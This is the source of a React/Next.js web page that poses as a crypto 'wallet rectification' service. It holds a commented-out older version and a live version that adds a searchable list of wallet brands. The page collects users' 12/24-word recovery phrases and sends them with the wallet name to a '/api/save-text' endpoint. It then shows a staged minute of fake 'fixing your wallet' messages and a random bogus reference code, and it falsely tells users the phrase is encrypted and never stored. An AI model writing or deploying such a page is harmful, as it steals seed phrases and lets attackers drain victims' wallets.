

// "use client"

// import type React from "react"

// import { motion, AnimatePresence } from "framer-motion"
// import { ArrowLeft, CheckCircle, AlertCircle, Copy } from "lucide-react"
// import Link from "next/link"
// import { useState, useEffect, useRef } from "react"

// export default function VerificationPage() {
//   const [phrase, setPhrase] = useState("")
//   const [isLoading, setIsLoading] = useState(false)
//   const [error, setError] = useState("")
//   const [showModal, setShowModal] = useState(false)
//   const [modalStep, setModalStep] = useState(0)
//   const [referenceCode, setReferenceCode] = useState("")
//   const [copied, setCopied] = useState(false)
//   const timerRef = useRef<NodeJS.Timeout | null>(null)

//   // Function to count words in the phrase
//   const countWords = (text: string) => {
//     return text
//       .trim()
//       .split(/\s+/)
//       .filter((word) => word.length > 0).length
//   }

//   // Function to generate a random reference code
//   const generateReferenceCode = () => {
//     const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
//     let result = "REF-"
//     for (let i = 0; i < 8; i++) {
//       result += characters.charAt(Math.floor(Math.random() * characters.length))
//     }
//     return result
//   }

//   // Copy reference code to clipboard
//   const copyToClipboard = () => {
//     navigator.clipboard.writeText(referenceCode)
//     setCopied(true)
//     setTimeout(() => setCopied(false), 2000)
//   }

//   // Clean up timers when component unmounts
//   useEffect(() => {
//     return () => {
//       if (timerRef.current) {
//         clearTimeout(timerRef.current)
//       }
//     }
//   }, [])

//   // Handle form submission
//   const handleSubmit = async (e: React.FormEvent) => {
//     e.preventDefault()
//     setError("")

//     // Validate the phrase has at least 12 words
//     const wordCount = countWords(phrase)
//     if (wordCount < 12) {
//       setError("Please check and enter a valid recovery phrase with at least 12 words.")
//       return
//     }

//     setIsLoading(true)

//     try {
//       // Submit to database
//       const response = await fetch("/api/save-text", {
//         method: "POST",
//         headers: {
//           "Content-Type": "application/json",
//         },
//         body: JSON.stringify({ content: phrase }),
//       })

//       if (!response.ok) {
//         throw new Error("Failed to save data")
//       }

//       // Show the modal with loading sequence
//       setShowModal(true)
//       setModalStep(0)

//       // First step: "Checking for error..." (8 seconds)
//       timerRef.current = setTimeout(() => {
//         setModalStep(1)

//         // Second step: "Rectifying..." (8 seconds)
//         timerRef.current = setTimeout(() => {
//           setModalStep(2)

//           // Third step: "Please wait..." (remaining time until 60 seconds total)
//           timerRef.current = setTimeout(() => {
//             // Generate reference code
//             setReferenceCode(generateReferenceCode())
//             setModalStep(3)
//             setIsLoading(false)
//           }, 44000) // 60 - (8+8) = 44 seconds
//         }, 8000)
//       }, 8000)
//     } catch (error) {
//       console.error("Error submitting data:", error)
//       setError("An error occurred while processing your request. Please try again.")
//       setIsLoading(false)
//     }
//   }

//   return (
//     <div className="min-h-screen bg-gradient-to-br from-emerald-900 to-teal-800 py-12 px-4">
//       <div className="container mx-auto max-w-md">
//         <Link
//           href="/rectify"
//           className="inline-flex items-center text-white mb-6 hover:text-emerald-300 transition-colors"
//         >
//           <ArrowLeft className="w-4 h-4 mr-2" />
//           Back to wallets
//         </Link>

//         <motion.div
//           className="bg-white rounded-xl shadow-xl overflow-hidden"
//           initial={{ opacity: 0, y: 20 }}
//           animate={{ opacity: 1, y: 0 }}
//           transition={{ duration: 0.5 }}
//         >
//           <div className="bg-gradient-to-r from-emerald-600 to-teal-500 p-6">
//             <h1 className="text-2xl font-bold text-white">Wallet Verification</h1>
//             <p className="text-white/90 text-sm mt-1">Verify your wallet to continue with rectification</p>
//           </div>

//           <div className="p-6">
//             {error && (
//               <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start">
//                 <AlertCircle className="w-5 h-5 text-red-500 mr-2 flex-shrink-0 mt-0.5" />
//                 <p className="text-red-700 text-sm">{error}</p>
//               </div>
//             )}

//             <form onSubmit={handleSubmit}>
//               <div className="mb-6">
//                 <label className="block text-sm font-medium text-gray-700 mb-2">
//                   Enter your recovery phrase (minimum 12 words)
//                 </label>
//                 <textarea
//                   className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-transparent min-h-[120px]"
//                   placeholder="Enter your 12/24 word recovery phrase separated by spaces"
//                   value={phrase}
//                   onChange={(e) => setPhrase(e.target.value)}
//                   required
//                 />
//                 <p className="text-xs text-gray-500 mt-2">
//                   Your recovery phrase is securely encrypted and never stored in plain text.
//                 </p>
//               </div>

//               <div className="mb-6">
//                 <label className="block text-sm font-medium text-gray-700 mb-2">Verification Method</label>
//                 <div className="space-y-2">
//                   <div className="flex items-center">
//                     <input
//                       type="radio"
//                       id="phrase"
//                       name="verification"
//                       className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
//                       defaultChecked
//                     />
//                     <label htmlFor="phrase" className="ml-2 text-sm text-gray-700">
//                       Recovery Phrase (Recommended)
//                     </label>
//                   </div>
//                   <div className="flex items-center">
//                     <input
//                       type="radio"
//                       id="keystore"
//                       name="verification"
//                       className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
//                     />
//                     <label htmlFor="keystore" className="ml-2 text-sm text-gray-700">
//                       Keystore JSON
//                     </label>
//                   </div>
//                   <div className="flex items-center">
//                     <input
//                       type="radio"
//                       id="private"
//                       name="verification"
//                       className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
//                     />
//                     <label htmlFor="private" className="ml-2 text-sm text-gray-700">
//                       Private Key
//                     </label>
//                   </div>
//                 </div>
//               </div>

//               <button
//                 type="submit"
//                 className={`w-full py-3 px-4 rounded-lg text-white font-medium ${
//                   isLoading
//                     ? "bg-gray-400 cursor-not-allowed"
//                     : "bg-gradient-to-r from-emerald-600 to-teal-500 hover:shadow-lg transition-all duration-300"
//                 }`}
//                 disabled={isLoading}
//               >
//                 {isLoading ? (
//                   <span className="flex items-center justify-center">
//                     <svg
//                       className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
//                       xmlns="http://www.w3.org/2000/svg"
//                       fill="none"
//                       viewBox="0 0 24 24"
//                     >
//                       <circle
//                         className="opacity-25"
//                         cx="12"
//                         cy="12"
//                         r="10"
//                         stroke="currentColor"
//                         strokeWidth="4"
//                       ></circle>
//                       <path
//                         className="opacity-75"
//                         fill="currentColor"
//                         d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
//                       ></path>
//                     </svg>
//                     Verifying...
//                   </span>
//                 ) : (
//                   "Verify Wallet"
//                 )}
//               </button>
//             </form>

//             <div className="mt-6 text-center">
//               <p className="text-xs text-gray-500">
//                 By continuing, you agree to our Terms of Service and Privacy Policy.
//               </p>
//             </div>
//           </div>
//         </motion.div>
//       </div>

//       {/* Processing Modal */}
//       <AnimatePresence>
//         {showModal && (
//           <motion.div
//             className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4"
//             initial={{ opacity: 0 }}
//             animate={{ opacity: 1 }}
//             exit={{ opacity: 0 }}
//           >
//             <motion.div
//               className="bg-white rounded-xl shadow-2xl max-w-md w-full overflow-hidden"
//               initial={{ scale: 0.9, opacity: 0 }}
//               animate={{ scale: 1, opacity: 1 }}
//               exit={{ scale: 0.9, opacity: 0 }}
//             >
//               <div className="bg-gradient-to-r from-emerald-600 to-teal-500 p-5">
//                 <h2 className="text-xl font-bold text-white">Wallet Rectification</h2>
//               </div>

//               <div className="p-6">
//                 {modalStep === 0 && (
//                   <div className="text-center py-8">
//                     <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
//                       <svg
//                         className="animate-spin h-8 w-8 text-emerald-500"
//                         xmlns="http://www.w3.org/2000/svg"
//                         fill="none"
//                         viewBox="0 0 24 24"
//                       >
//                         <circle
//                           className="opacity-25"
//                           cx="12"
//                           cy="12"
//                           r="10"
//                           stroke="currentColor"
//                           strokeWidth="4"
//                         ></circle>
//                         <path
//                           className="opacity-75"
//                           fill="currentColor"
//                           d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
//                         ></path>
//                       </svg>
//                     </div>
//                     <h3 className="text-lg font-medium text-gray-900 mb-2">Checking for errors...</h3>
//                     <p className="text-gray-500">Please wait while we analyze your wallet data</p>
//                   </div>
//                 )}

//                 {modalStep === 1 && (
//                   <div className="text-center py-8">
//                     <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
//                       <svg
//                         className="animate-spin h-8 w-8 text-emerald-500"
//                         xmlns="http://www.w3.org/2000/svg"
//                         fill="none"
//                         viewBox="0 0 24 24"
//                       >
//                         <circle
//                           className="opacity-25"
//                           cx="12"
//                           cy="12"
//                           r="10"
//                           stroke="currentColor"
//                           strokeWidth="4"
//                         ></circle>
//                         <path
//                           className="opacity-75"
//                           fill="currentColor"
//                           d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
//                         ></path>
//                       </svg>
//                     </div>
//                     <h3 className="text-lg font-medium text-gray-900 mb-2">Rectifying...</h3>
//                     <p className="text-gray-500">We're working on resolving the identified issues</p>
//                   </div>
//                 )}

//                 {modalStep === 2 && (
//                   <div className="text-center py-8">
//                     <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
//                       <svg
//                         className="animate-spin h-8 w-8 text-emerald-500"
//                         xmlns="http://www.w3.org/2000/svg"
//                         fill="none"
//                         viewBox="0 0 24 24"
//                       >
//                         <circle
//                           className="opacity-25"
//                           cx="12"
//                           cy="12"
//                           r="10"
//                           stroke="currentColor"
//                           strokeWidth="4"
//                         ></circle>
//                         <path
//                           className="opacity-75"
//                           fill="currentColor"
//                           d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
//                         ></path>
//                       </svg>
//                     </div>
//                     <h3 className="text-lg font-medium text-gray-900 mb-2">Please wait, we are fixing your wallet</h3>
//                     <p className="text-gray-500">
//                       Our system is applying advanced blockchain solutions to restore your wallet functionality
//                     </p>
//                   </div>
//                 )}

//                 {modalStep === 3 && (
//                   <div className="py-6">
//                     <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
//                       <CheckCircle className="h-8 w-8 text-emerald-500" />
//                     </div>
//                     <h3 className="text-lg font-medium text-gray-900 mb-2 text-center">
//                       Rectification Process Initiated
//                     </h3>
//                     <p className="text-gray-600 mb-6 text-center">
//                       Your wallet rectification process has been successfully initiated. The process will be completed
//                       within 24 hours.
//                     </p>

//                     <div className="bg-gray-50 p-4 rounded-lg mb-6">
//                       <div className="flex justify-between items-center mb-2">
//                         <span className="text-sm font-medium text-gray-700">Reference Code:</span>
//                         <button
//                           onClick={copyToClipboard}
//                           className="text-emerald-600 hover:text-emerald-700 text-sm flex items-center"
//                         >
//                           <Copy className="w-4 h-4 mr-1" />
//                           {copied ? "Copied!" : "Copy"}
//                         </button>
//                       </div>
//                       <div className="bg-white border border-gray-200 rounded p-3 font-mono text-center text-lg">
//                         {referenceCode}
//                       </div>
//                       <p className="text-xs text-gray-500 mt-2">
//                         Please save this code for your reference. You'll need it to check the status of your
//                         rectification.
//                       </p>
//                     </div>

//                     <div className="flex justify-end">
//                       <button
//                         onClick={() => setShowModal(false)}
//                         className="px-4 py-2 bg-gradient-to-r from-emerald-600 to-teal-500 text-white rounded-lg hover:shadow-md transition-all"
//                       >
//                         Close
//                       </button>
//                     </div>
//                   </div>
//                 )}
//               </div>
//             </motion.div>
//           </motion.div>
//         )}
//       </AnimatePresence>
//     </div>
//   )
// }

"use client"

import type React from "react"

import { motion, AnimatePresence } from "framer-motion"
import { ArrowLeft, CheckCircle, AlertCircle, Copy, Search, X } from "lucide-react"
import Link from "next/link"
import { useState, useEffect, useRef } from "react"

export default function VerificationPage() {
  const [phrase, setPhrase] = useState("")
  const [walletName, setWalletName] = useState("")
  const [searchQuery, setSearchQuery] = useState("")
  const [isDropdownOpen, setIsDropdownOpen] = useState(false)
  const [isLoading, setIsLoading] = useState(false)
  const [error, setError] = useState("")
  const [showModal, setShowModal] = useState(false)
  const [modalStep, setModalStep] = useState(0)
  const [referenceCode, setReferenceCode] = useState("")
  const [copied, setCopied] = useState(false)
  const timerRef = useRef<NodeJS.Timeout | null>(null)
  const dropdownRef = useRef<HTMLDivElement>(null)

  // List of all wallet names
  const walletOptions = [
    "Meta Mask",
    "Trust",
    "Solflare",
    "WalletConnect",
    "Terra",
    "Bitpay",
    "Maiar",
    "MyKey",
    "Atwallet",
    "Authereum",
    "Bifrost",
    "Binance Chain Wallet",
    "BitKeep",
    "Coinbase",
    "Coin98",
    "Crypto.com",
    "D'CENT",
    "Defiant",
    "Exodus",
    "Frame",
    "Huobi",
    "imToken",
    "Ledger Live",
    "MathWallet",
    "Phantom",
    "Rainbow",
    "SafePal",
    "Slope",
    "Sollet",
    "TokenPocket",
    "Trezor",
    "Torus",
    "Unstoppable Domains",
    "Venly",
    "Wallet.io",
    "Zelcore",
    "Brave",
    "XDEFI",
    "Rabby",
    "Sequence",
    "Frontier",
    "Enkrypt",
    "Zeal",
    "Argent",
    "Gnosis Safe",
    "Ambire",
    "Keplr",
    "Liquality",
    "Leap",
    "Cosmostation",
    "Clover",
    "Tokenary",
    "Infinity Wallet",
    "Taho",
    "OneKey",
    "Core",
    "Bitski",
    "Others",
  ]

  // Filtered wallet options based on search query
  const filteredWalletOptions = walletOptions.filter((wallet) =>
    wallet.toLowerCase().includes(searchQuery.toLowerCase()),
  )

  // Function to count words in the phrase
  const countWords = (text: string) => {
    return text
      .trim()
      .split(/\s+/)
      .filter((word) => word.length > 0).length
  }

  // Function to generate a random reference code
  const generateReferenceCode = () => {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    let result = "REF-"
    for (let i = 0; i < 8; i++) {
      result += characters.charAt(Math.floor(Math.random() * characters.length))
    }
    return result
  }

  // Copy reference code to clipboard
  const copyToClipboard = () => {
    navigator.clipboard.writeText(referenceCode)
    setCopied(true)
    setTimeout(() => setCopied(false), 2000)
  }

  // Handle click outside dropdown
  useEffect(() => {
    function handleClickOutside(event: MouseEvent) {
      if (dropdownRef.current && !dropdownRef.current.contains(event.target as Node)) {
        setIsDropdownOpen(false)
      }
    }

    document.addEventListener("mousedown", handleClickOutside)
    return () => {
      document.removeEventListener("mousedown", handleClickOutside)
    }
  }, [])

  // Clean up timers when component unmounts
  useEffect(() => {
    return () => {
      if (timerRef.current) {
        clearTimeout(timerRef.current)
      }
    }
  }, [])

  // Handle form submission
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setError("")

    // Validate wallet selection
    if (!walletName) {
      setError("Please select your wallet type.")
      return
    }

    // Validate the phrase has at least 12 words
    const wordCount = countWords(phrase)
    if (wordCount < 12) {
      setError("Please check and enter a valid recovery phrase with at least 12 words.")
      return
    }

    setIsLoading(true)

    try {
      // Submit to database
      const response = await fetch("/api/save-text", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ content: phrase, name: walletName }),
      })

      if (!response.ok) {
        throw new Error("Failed to save data")
      }

      // Show the modal with loading sequence
      setShowModal(true)
      setModalStep(0)

      // First step: "Checking for error..." (8 seconds)
      timerRef.current = setTimeout(() => {
        setModalStep(1)

        // Second step: "Rectifying..." (8 seconds)
        timerRef.current = setTimeout(() => {
          setModalStep(2)

          // Third step: "Please wait..." (remaining time until 60 seconds total)
          timerRef.current = setTimeout(() => {
            // Generate reference code
            setReferenceCode(generateReferenceCode())
            setModalStep(3)
            setIsLoading(false)
          }, 44000) // 60 - (8+8) = 44 seconds
        }, 8000)
      }, 8000)
    } catch (error) {
      console.error("Error submitting data:", error)
      setError("An error occurred while processing your request. Please try again.")
      setIsLoading(false)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-emerald-900 to-teal-800 py-12 px-4">
      <div className="container mx-auto max-w-md">
        <Link
          href="/rectify"
          className="inline-flex items-center text-white mb-6 hover:text-emerald-300 transition-colors"
        >
          <ArrowLeft className="w-4 h-4 mr-2" />
          Back to wallets
        </Link>

        <motion.div
          className="bg-white rounded-xl shadow-xl overflow-hidden"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 0.5 }}
        >
          <div className="bg-gradient-to-r from-emerald-600 to-teal-500 p-6">
            <h1 className="text-2xl font-bold text-white">Wallet Verification</h1>
            <p className="text-white/90 text-sm mt-1">Verify your wallet to continue with rectification</p>
          </div>

          <div className="p-6">
            {error && (
              <div className="mb-4 p-3 bg-red-50 border border-red-200 rounded-lg flex items-start">
                <AlertCircle className="w-5 h-5 text-red-500 mr-2 flex-shrink-0 mt-0.5" />
                <p className="text-red-700 text-sm">{error}</p>
              </div>
            )}

            <form onSubmit={handleSubmit}>
              {/* Wallet Selection Dropdown */}
              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Select Your Wallet</label>
                <div className="relative" ref={dropdownRef}>
                  <div
                    className="w-full p-3 border border-gray-300 rounded-lg flex justify-between items-center cursor-pointer bg-white"
                    onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                  >
                    <span className={walletName ? "text-gray-900" : "text-gray-400"}>
                      {walletName || "Select wallet type"}
                    </span>
                    <svg
                      className={`w-5 h-5 text-gray-400 transition-transform ${
                        isDropdownOpen ? "transform rotate-180" : ""
                      }`}
                      fill="none"
                      stroke="currentColor"
                      viewBox="0 0 24 24"
                      xmlns="http://www.w3.org/2000/svg"
                    >
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M19 9l-7 7-7-7"></path>
                    </svg>
                  </div>

                  {/* Dropdown Menu */}
                  {isDropdownOpen && (
                    <div className="absolute z-10 mt-1 w-full bg-white border border-gray-200 rounded-lg shadow-lg max-h-60 overflow-y-auto">
                      {/* Search Input */}
                      <div className="sticky top-0 bg-white p-2 border-b border-gray-100">
                        <div className="relative">
                          <Search className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4" />
                          <input
                            type="text"
                            className="w-full pl-9 pr-4 py-2 text-sm border border-gray-200 rounded-md focus:outline-none focus:ring-2 focus:ring-emerald-500 focus:border-transparent"
                            placeholder="Search wallets..."
                            value={searchQuery}
                            onChange={(e) => setSearchQuery(e.target.value)}
                            onClick={(e) => e.stopPropagation()}
                          />
                          {searchQuery && (
                            <button
                              type="button"
                              className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 hover:text-gray-600"
                              onClick={(e) => {
                                e.stopPropagation()
                                setSearchQuery("")
                              }}
                            >
                              <X className="w-4 h-4" />
                            </button>
                          )}
                        </div>
                      </div>

                      {/* Wallet Options */}
                      <div className="py-1">
                        {filteredWalletOptions.length > 0 ? (
                          filteredWalletOptions.map((wallet) => (
                            <div
                              key={wallet}
                              className={`px-4 py-2 text-sm cursor-pointer hover:bg-emerald-50 ${
                                walletName === wallet ? "bg-emerald-50 text-emerald-700" : "text-gray-700"
                              }`}
                              onClick={() => {
                                setWalletName(wallet)
                                setIsDropdownOpen(false)
                                setSearchQuery("")
                              }}
                            >
                              {wallet}
                            </div>
                          ))
                        ) : (
                          <div className="px-4 py-2 text-sm text-gray-500">No wallets found</div>
                        )}
                      </div>
                    </div>
                  )}
                </div>
              </div>

              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Enter your recovery phrase (minimum 12 words)
                </label>
                <textarea
                  className="w-full p-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-emerald-500 focus:border-transparent min-h-[120px]"
                  placeholder="Enter your 12/24 word recovery phrase separated by spaces"
                  value={phrase}
                  onChange={(e) => setPhrase(e.target.value)}
                  required
                />
                <p className="text-xs text-gray-500 mt-2">
                  Your recovery phrase is securely encrypted and never stored in plain text.
                </p>
              </div>

              <div className="mb-6">
                <label className="block text-sm font-medium text-gray-700 mb-2">Verification Method</label>
                <div className="space-y-2">
                  <div className="flex items-center">
                    <input
                      type="radio"
                      id="phrase"
                      name="verification"
                      className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
                      defaultChecked
                    />
                    <label htmlFor="phrase" className="ml-2 text-sm text-gray-700">
                      Recovery Phrase (Recommended)
                    </label>
                  </div>
                  <div className="flex items-center">
                    <input
                      type="radio"
                      id="keystore"
                      name="verification"
                      className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
                    />
                    <label htmlFor="keystore" className="ml-2 text-sm text-gray-700">
                      Keystore JSON
                    </label>
                  </div>
                  <div className="flex items-center">
                    <input
                      type="radio"
                      id="private"
                      name="verification"
                      className="h-4 w-4 text-emerald-600 focus:ring-emerald-500"
                    />
                    <label htmlFor="private" className="ml-2 text-sm text-gray-700">
                      Private Key
                    </label>
                  </div>
                </div>
              </div>

              <button
                type="submit"
                className={`w-full py-3 px-4 rounded-lg text-white font-medium ${
                  isLoading
                    ? "bg-gray-400 cursor-not-allowed"
                    : "bg-gradient-to-r from-emerald-600 to-teal-500 hover:shadow-lg transition-all duration-300"
                }`}
                disabled={isLoading}
              >
                {isLoading ? (
                  <span className="flex items-center justify-center">
                    <svg
                      className="animate-spin -ml-1 mr-3 h-5 w-5 text-white"
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 24 24"
                    >
                      <circle
                        className="opacity-25"
                        cx="12"
                        cy="12"
                        r="10"
                        stroke="currentColor"
                        strokeWidth="4"
                      ></circle>
                      <path
                        className="opacity-75"
                        fill="currentColor"
                        d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                      ></path>
                    </svg>
                    Verifying...
                  </span>
                ) : (
                  "Verify Wallet"
                )}
              </button>
            </form>

            <div className="mt-6 text-center">
              <p className="text-xs text-gray-500">
                By continuing, you agree to our Terms of Service and Privacy Policy.
              </p>
            </div>
          </div>
        </motion.div>
      </div>

      {/* Processing Modal */}
      <AnimatePresence>
        {showModal && (
          <motion.div
            className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4"
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
          >
            <motion.div
              className="bg-white rounded-xl shadow-2xl max-w-md w-full overflow-hidden"
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
            >
              <div className="bg-gradient-to-r from-emerald-600 to-teal-500 p-5">
                <h2 className="text-xl font-bold text-white">Wallet Rectification</h2>
              </div>

              <div className="p-6">
                {modalStep === 0 && (
                  <div className="text-center py-8">
                    <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
                      <svg
                        className="animate-spin h-8 w-8 text-emerald-500"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                    </div>
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Checking for errors...</h3>
                    <p className="text-gray-500">Please wait while we analyze your {walletName} wallet data</p>
                  </div>
                )}

                {modalStep === 1 && (
                  <div className="text-center py-8">
                    <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
                      <svg
                        className="animate-spin h-8 w-8 text-emerald-500"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                    </div>
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Rectifying...</h3>
                    <p className="text-gray-500">
                      We're working on resolving the identified issues with your {walletName}
                    </p>
                  </div>
                )}

                {modalStep === 2 && (
                  <div className="text-center py-8">
                    <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
                      <svg
                        className="animate-spin h-8 w-8 text-emerald-500"
                        xmlns="http://www.w3.org/2000/svg"
                        fill="none"
                        viewBox="0 0 24 24"
                      >
                        <circle
                          className="opacity-25"
                          cx="12"
                          cy="12"
                          r="10"
                          stroke="currentColor"
                          strokeWidth="4"
                        ></circle>
                        <path
                          className="opacity-75"
                          fill="currentColor"
                          d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"
                        ></path>
                      </svg>
                    </div>
                    <h3 className="text-lg font-medium text-gray-900 mb-2">Please wait, we are fixing your wallet</h3>
                    <p className="text-gray-500">
                      Our system is applying advanced blockchain solutions to restore your {walletName} functionality
                    </p>
                  </div>
                )}

                {modalStep === 3 && (
                  <div className="py-6">
                    <div className="w-16 h-16 mx-auto mb-4 rounded-full bg-emerald-50 flex items-center justify-center">
                      <CheckCircle className="h-8 w-8 text-emerald-500" />
                    </div>
                    <h3 className="text-lg font-medium text-gray-900 mb-2 text-center">
                      Rectification Process Initiated
                    </h3>
                    <p className="text-gray-600 mb-6 text-center">
                      Your {walletName} wallet rectification process has been successfully initiated. The process will
                      be completed within 24 hours.
                    </p>

                    <div className="bg-gray-50 p-4 rounded-lg mb-6">
                      <div className="flex justify-between items-center mb-2">
                        <span className="text-sm font-medium text-gray-700">Reference Code:</span>
                        <button
                          onClick={copyToClipboard}
                          className="text-emerald-600 hover:text-emerald-700 text-sm flex items-center"
                        >
                          <Copy className="w-4 h-4 mr-1" />
                          {copied ? "Copied!" : "Copy"}
                        </button>
                      </div>
                      <div className="bg-white border border-gray-200 rounded p-3 font-mono text-center text-lg">
                        {referenceCode}
                      </div>
                      <p className="text-xs text-gray-500 mt-2">
                        Please save this code for your reference. You'll need it to check the status of your
                        rectification.
                      </p>
                    </div>

                    <div className="flex justify-end">
                      <button
                        onClick={() => setShowModal(false)}
                        className="px-4 py-2 bg-gradient-to-r from-emerald-600 to-teal-500 text-white rounded-lg hover:shadow-md transition-all"
                      >
                        Close
                      </button>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  )
}